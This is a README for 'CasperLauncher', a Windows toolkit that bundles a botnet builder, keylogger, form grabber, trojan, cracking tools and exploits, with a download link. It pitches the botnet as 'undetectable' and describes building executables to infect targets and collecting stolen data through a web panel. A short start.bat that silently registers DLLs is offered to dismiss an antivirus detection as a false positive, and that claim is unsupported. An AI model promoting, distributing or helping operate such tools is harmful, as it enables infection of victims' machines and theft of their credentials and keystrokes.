# CasperLauncher - Most Complete Attacker

[![Preview image](https://scontent-b-sin.xx.fbcdn.net/hphotos-xpa1/v/t1.0-9/10365880_982912881724553_6014788293436251191_n.jpg?oh=128dd15916973df2e82d0ffaa6175ff2&oe=551D430D)](http://www.youtube.com/watch?v=pG-0WId0SxA)

CasperLauncher is a Hacking Framework Interface built for Windows. it’s most Complete Security Tools Package
Included:
* CasperSpy ver2.1
* Botnet
* Cracking Tools
* Exploit
* FormGrabber
* Keylogger
* Trojan
* Social Engginering

## With Complete Guides and Tutorial

![Guide](https://scontent-a-sin.xx.fbcdn.net/hphotos-xaf1/v/t1.0-9/s720x720/10806256_982932011722640_452064625651458105_n.jpg?oh=b29c1ea924d38e2f2a8ae784fa134351&oe=55174681)

**All tools in CasperLauncher equipped by Tutorial and Guide How to use it**

So you can easily use any toolkit therein.
CasperLauncher is distributed in the hope that it will be useful.

***

# CasperSpy - Effortless Botnet Builder 

**The easiest way to build Undetectable Botnet**

[![Preview image](https://fbcdn-sphotos-b-a.akamaihd.net/hphotos-ak-xpa1/v/t1.0-9/10675757_982922371723604_1389677735045922449_n.jpg?oh=d081e4a0792efdfca758507dfd11a07f&oe=55158129&__gda__=1427388561_439c13f7d9f3221e467b6a0e18713942)](https://www.youtube.com/watch?v=m8PTBXZBK5E)

## How Does CasperSpy Work?

**CasperSpy** is toolkit that provide a bot creation all of the tools required to build and administer a botnet.
**CSBuilder** tool allows to create the executables that will be used to infect Target computers.
**CasperSpy Panel** is web based control panel used to maintain and update the botnet, and to retrieve/organize recovered information through a browser. 

## [Download New Release here](https://github.com/dhanumurti/casperspy/releases)

# Scan Result

Scanning Archive here : https://www.virustotal.com/en/file/e5659ae1a0019052ad2775ad239ed7c297a767f187d9c8546b1d39bb9388b105/analysis/1416241356/

**Possible_Otorun8** is false detection
I admit I did made autorun batch script on casperlauncher installer precisely in **start.bat**
you can find this script on casperlauncher folder **C:\Program Files\CasperLauncher**
this script will install & register activex component before casperlauncher starting up.

If i didn’t do it error notification _**“missing or corrupt codejock~1 component”**_ will appear
This is the content of **Start.bat** script:

`@echo off`
`echo :: ---------------------------------------`
`echo :: Install and Register activex components`
`echo :: ---------------------------------------`
`pause`
`for %%f in (*.ocx *.dll) do regsvr32 /s %%f`
`echo :: -------`
`echo :: Succeed`
`echo :: -------`
`echo :: --------------------`
`echo :: start CasperLauncher`
`echo :: --------------------`
`pause`
`start casperlauncher.exe`

***

# DISCLAIMER EULA

CasperSpy is a free security software provided by Casperspy.com 
Copyright (C) 2014 by Sillhouette @casperspy 
This program is free software: you can redistribute it 
and modify it under the terms of the GNU 

General Public License as 
published by the Free Software Foundation, 
either version 3 of the License.

This program is distributed in the hope that it will be useful, 
but WITHOUT ANY WARRANTY; 
without even the implied warranty 
of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 
See the GNU General Public License for more details. 

You should have received a copy of the GNU General Public 
License along with this program.  
If not, see <http://www.gnu.org/licenses/>.

NOTE: CasperSpy Official web is suspended. Donation can help me so much to buy new hosting and domain Casperspy.org
casperspy.botnet@gmail.com
